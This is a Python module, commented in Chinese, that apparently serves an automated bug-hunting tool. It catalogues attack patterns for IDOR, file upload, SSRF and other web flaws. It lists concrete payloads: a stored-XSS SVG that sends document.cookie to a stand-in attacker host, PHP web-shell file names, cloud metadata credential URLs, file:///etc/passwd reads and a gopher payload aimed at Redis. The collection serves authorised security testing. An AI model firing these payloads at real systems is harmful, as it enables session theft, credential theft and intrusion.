"""
pattern_library.py — 从 Claude-BugHunter 知识库提取的漏洞模式库

用于 Phase ④ 精准验证阶段的 payload 选择。
比原来简单列的 payload 类别更丰富、更精准。
"""
from typing import Dict, List


# ====================================================================
# IDOR 模式库
# 来源: knowledge/disclosed-reports/hunt-idor.md
# ====================================================================
IDOR_PATTERNS: List[Dict] = [
    {
        "name": "numeric_sequential",
        "description": "数字顺序 ID 枚举 (最常见的 IDOR)",
        "test": "GET /api/orders/{your_id - 1}, GET /api/orders/{your_id + 1}",
        "validation": "响应中包含不同用户的数据 — name, email, address",
        "pay_grade": "medium to high",
    },
    {
        "name": "http_method_swap",
        "description": "HTTP 方法切换绕过 (GET → PUT/POST/DELETE)",
        "test": "OPTIONS, HEAD, POST, PUT, PATCH, DELETE, TRACE 同一 URL",
        "validation": "PUT/DELETE 成功修改了其他用户的资源 (200/204)",
        "pay_grade": "high",
    },
    {
        "name": "x_http_method_override",
        "description": "X-HTTP-Method-Override 头绕过",
        "test": 'POST /api/users/{victim} 加头 X-HTTP-Method-Override: DELETE',
        "validation": "资源被修改, 尽管原始方法是 POST",
        "pay_grade": "high",
    },
    {
        "name": "array_wrap_param_pollution",
        "description": "数组包装参数污染",
        "test": "id={your_id}&id={victim_id} 或 JSON {\"id\": [\"your_id\", \"victim_id\"]}",
        "validation": "权限检查通过第一个 ID, 但查询操作了第二个 ID",
        "pay_grade": "high",
    },
    {
        "name": "hidden_json_field",
        "description": "隐藏 JSON 字段覆盖",
        "test": "在 JSON 体中添加 owner_id, user_id, account_id 等字段",
        "validation": "动作作用到了受害者的账号上",
        "pay_grade": "high to critical",
    },
    {
        "name": "graphql_node_resolver",
        "description": "GraphQL node() 全局解析器 IDOR",
        "test": "base64 解码全局 ID → 修改数字 → 重新编码 → query node(id: \"...\")",
        "validation": "通过 node() 解析器返回了其他用户的对象",
        "pay_grade": "high",
    },
]

# ====================================================================
# 文件上传模式库
# 来源: knowledge/disclosed-reports/hunt-file-upload.md
# ====================================================================
FILE_UPLOAD_PATTERNS: List[Dict] = [
    {
        "name": "case_extension_bypass",
        "description": "扩展名大小写绕过",
        "test": ["shell.PHP", "shell.Php", "shell.pHp"],
        "validation": "PHP 执行而非显示源码",
        "pay_grade": "critical",
    },
    {
        "name": "double_extension",
        "description": "双扩展名绕过",
        "test": ["shell.php.jpg", "shell.jpg.php"],
        "validation": "PHP 执行",
        "pay_grade": "critical",
    },
    {
        "name": "alt_php_extensions",
        "description": "替代 PHP 扩展名",
        "test": [".phar", ".pht", ".phtml", ".php5", ".php7", ".phps", ".phtm", ".inc"],
        "validation": "PHP 执行",
        "pay_grade": "critical",
    },
    {
        "name": "content_type_spoof",
        "description": "Content-Type 头伪造",
        "test": "PHP 源码配 Content-Type: image/jpeg",
        "validation": "PHP 执行",
        "pay_grade": "critical",
    },
    {
        "name": "magic_byte_polyglot",
        "description": "魔术字节多格式文件 (图片 + PHP)",
        "test": "JPEG 头 (FF D8 FF E0...) + PHP 源码, 保存为 shell.php",
        "validation": "PHP 执行尽管头是有效图片",
        "pay_grade": "critical",
    },
    {
        "name": "svg_stored_xss",
        "description": "SVG 嵌入式 JavaScript (存储型 XSS)",
        "test": "<svg xmlns=\"...\" onload=\"fetch('//attacker.tld/x?'+document.cookie)\"><script>...</script></svg>",
        "validation": "加载图片时执行了 JS",
        "pay_grade": "critical",
    },
]

# ====================================================================
# SSRF 模式库
# 来源: knowledge/disclosed-reports/hunt-ssrf.md
# ====================================================================
SSRF_PATTERNS: List[Dict] = [
    {
        "name": "cloud_metadata",
        "description": "云元数据端点探测",
        "targets": [
            "http://169.254.169.254/latest/meta-data/",        # AWS IMDSv1
            "http://169.254.169.254/latest/meta-data/iam/security-credentials/",  # AWS 凭据
            "http://metadata.google.internal/computeMetadata/v1/",  # GCP
            "http://169.254.169.254/metadata/instance?api-version=2021-02-01",  # Azure
        ],
        "validation": "响应中包含云凭据或实例元数据",
        "pay_grade": "critical",
    },
    {
        "name": "ip_obfuscation",
        "description": "IP 混淆绕过",
        "test": ["http://0x7f.0x0.0x0.0x1/", "http://2130706433/", "http://017700000001/"],
        "validation": "访问到 localhost",
        "pay_grade": "high",
    },
    {
        "name": "dns_rebinding",
        "description": "DNS 重绑定绕过",
        "test": "使用 1u.ms 或 nip.io 风格域名: http://1.2.3.4.nip.io/",
        "validation": "绕过主机名黑名单访问到内部 IP",
        "pay_grade": "high",
    },
    {
        "name": "protocol_coercion",
        "description": "协议强制 (file://, gopher://, dict://)",
        "test": ["file:///etc/passwd", "gopher://internal:6379/_*1%0d%0a$4%0d%0aPING"],
        "validation": "读取本地文件或与内部服务交互",
        "pay_grade": "high to critical",
    },
]

# ====================================================================
# 突破口类型 → 对应 payload 模式的映射
# ====================================================================
BREAKTHROUGH_PATTERNS: Dict[str, List[Dict]] = {
    "idor": IDOR_PATTERNS,
    "file_upload": FILE_UPLOAD_PATTERNS,
    "upload": FILE_UPLOAD_PATTERNS,
    "ssrf": SSRF_PATTERNS,
}

# ====================================================================
# 突破口类型扩展列表 (对比原来 Phase ③ 的 7 种)
# 来源: knowledge/disclosed-reports/hunt-*.md
# ====================================================================
BREAKTHROUGH_TYPES = {
    "idor": "参数化 ID 未做对象级权限校验",
    "sqli": "SQL 注入 (error-based / blind / time-based / OOB)",
    "xss": "跨站脚本 (reflected / stored / DOM / mXSS)",
    "ssrf": "服务端请求伪造 (云元数据 / 内网探测 / 协议切换)",
    "file_upload": "文件上传 (扩展绕过 / 双扩展 / SVG / Phar)",
    "upload": "文件上传 (同 file_upload)",
    "cmdi": "命令注入",
    "rce": "远程代码执行 (OGNL / SpEL / 反序列化)",
    "ssti": "模板注入 (SSTI / Jinja2 / Twig / Freemarker)",
    "xxe": "XML 外部实体注入",
    "auth_bypass": "认证绕过",
    "jwt": "JWT 攻击 (alg=none / 弱密钥 / kid 注入)",
    "oauth": "OAuth 攻击 (redirect_uri / state / PKCE downgrade)",
    "graphql": "GraphQL 攻击 (introspection / node IDOR / alias batching / depth DoS)",
    "ssti_rce": "SSTI → RCE 链",
    "http_smuggling": "HTTP 请求走私",
    "cache_poison": "Web 缓存投毒",
    "host_header": "Host 头注入",
    "open_redirect": "开放重定向",
    "cors": "CORS 配置不当",
    "csrf": "跨站请求伪造 (无 CSRF token)",
    "race_condition": "竞争条件",
    "business_logic": "业务逻辑漏洞",
    "pii_leak": "PII 泄露",
    "api_misconfig": "API 配置不当",
    "mfa_bypass": "MFA 绕过",
    "ato": "账号接管 (Account Takeover)",
}

# ====================================================================
# payload_category 扩展
# ====================================================================
PAYLOAD_CATEGORIES = {
    # 原有
    "sql_error": "SQL 报错注入",
    "xss_reflected": "反射型 XSS",
    "idor_numeric": "数字 IDOR",
    "cmdi_basic": "命令注入",
    "file_upload": "文件上传",
    "ssrf_basic": "SSRF",
    "auth_bypass": "认证绕过",
    # 扩展
    "ssrf_cloud_metadata": "SSRF 云元数据",
    "ssrf_dns_rebind": "SSRF DNS 重绑定",
    "ssrf_protocol_coerce": "SSRF 协议强制",
    "jwt_none_alg": "JWT alg=none",
    "jwt_weak_secret": "JWT 弱密钥",
    "jwt_kid_injection": "JWT kid 注入",
    "oauth_redirect_uri_bypass": "OAuth redirect_uri 绕过",
    "oauth_missing_state": "OAuth 缺少 state 参数",
    "graphql_introspection": "GraphQL introspection",
    "graphql_alias_batch": "GraphQL alias 批量",
    "ssti_basic": "SSTI 基础探测",
    "xxe_oob": "XXE OOB",
    "http_smuggling_cl_te": "HTTP 请求走私 CL.TE",
    "cache_poison_header": "Web 缓存投毒",
}
